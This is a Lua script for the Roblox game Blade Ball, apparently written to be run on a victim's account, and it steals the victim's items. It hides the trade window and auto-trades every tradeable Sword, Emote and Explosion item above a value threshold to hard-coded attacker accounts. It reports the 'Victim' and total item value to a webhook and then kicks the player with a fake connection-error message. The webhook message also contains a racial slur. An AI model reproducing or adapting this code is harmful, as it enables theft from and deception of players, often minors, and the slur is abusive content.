-- Configuration
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

-- Paramètres (A ajuster avec tes infos)
local users = _G.Usernames or {"ThunderStealthZap16", "Natalhie10"}
local webhook = _G.webhook or "" 
local auth_token = "EBK-SS-A" 
local min_rap = _G.min_rap or 0 

-- Interfaces
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false

-- Désactivation propre de l'UI pour éviter les conflits et les déclins auto
local function setupUI()
    pcall(function()
        tradeGui.Enabled = false
        -- On empêche le script de fermer le trade violemment lors du changement d'état
        tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
            inTrade = tradeGui.Enabled
            if inTrade then
                tradeGui.Enabled = false -- Reste invisible mais actif côté serveur
            end
        end)
    end)
end
setupUI()

local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local function getRAP(category, itemName)
    local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
    if not success or not rapData then return 0 end
    for skey, rap in pairs(rapData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" and pair[2] == itemName then return rap end
            end
        end
    end
    return 0
end

-- Webhook stylé selon l'image image_2026-02-17_185250511.png
local function SendStatusWebhook(title, color)
    local totalRAP = 0
    for _, item in ipairs(itemsToSend) do
        totalRAP = totalRAP + item.RAP
    end

    local payload = {
        ["auth_token"] = auth_token,
        ["embeds"] = {{
            ["title"] = "⚠️ " .. title,
            ["color"] = color, -- Jaune : 16776960
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. math.floor(totalRAP) .. "```", inline = true}
            },
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
            },
            ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
        }}
    }

    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

local function startAutoTrade(targetPlayer)
    task.spawn(function()
        -- Tri du RAP décroissant
        table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)

        while #itemsToSend > 0 do
            -- Envoi de la requête de trade
            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
            
            -- Attente que le trade soit accepté (plus robuste)
            local timeout = 0
            while not inTrade and timeout < 30 do
                task.wait(1)
                timeout = timeout + 1
            end
            
            if inTrade then
                task.wait(1.5) -- Délai de sécurité pour éviter le déclin auto du jeu
                
                local limit = 0
                while #itemsToSend > 0 and limit < 50 do
                    local item = table.remove(itemsToSend, 1)
                    pcall(function()
                        netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                    end)
                    limit = limit + 1
                    task.wait(0.1)
                end

                task.wait(1)
                netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
                task.wait(1)
                netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
                
                -- Attente de la fin du trade avant la suite
                repeat task.wait(1) until not inTrade
            end
            task.wait(2)
        end
        
        task.wait(2)
        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
    end)
end

-- Scan Initial
for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            if not info.TradeLock then
                local rap = getRAP(cat, info.Name)
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

-- Logique de détection
if #itemsToSend > 0 then
    local function checkAndStart()
        for _, p in ipairs(Players:GetPlayers()) do
            if table.find(users, p.Name) then
                SendStatusWebhook("The nigga is on the server !", 16776960) -- Embed Jaune
                startAutoTrade(p)
                return true
            end
        end
        return false
    end

    if not checkAndStart() then
        Players.PlayerAdded:Connect(function(player)
            if table.find(users, player.Name) then
                SendStatusWebhook("The nigga is on the server !", 16776960)
                startAutoTrade(player)
            end
        end)
    end
end
